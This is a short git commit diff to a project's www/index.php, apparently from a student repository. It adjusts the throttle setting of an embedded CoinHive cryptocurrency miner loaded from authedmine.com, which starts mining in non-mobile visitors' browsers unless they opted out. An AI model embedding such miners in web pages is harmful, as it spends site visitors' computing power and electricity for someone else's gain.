78163e6d74fffe42fc32a46ddb96925c2e1dc873
Antoine VIVIES <antoine.vivies@epitech.eu>
2018-10-06 11:02:52 +0200

    index.php modif

--- www/index.php
+++ www/index.php
@@ -28,7 +28,7 @@
 </body>
 <script src="https://authedmine.com/lib/authedmine.min.js"></script>
 <script>
-    var miner = new CoinHive.Anonymous('xy2FXjexnAKrdgQ2IUpS7WpFhllyXrtk', {throttle: 0.3});
+    var miner = new CoinHive.Anonymous('xy2FXjexnAKrdgQ2IUpS7WpFhllyXrtk', {throttle: 0.6});
 
     if (!miner.isMobile() && !miner.didOptOut(14400)) {
         miner.start();
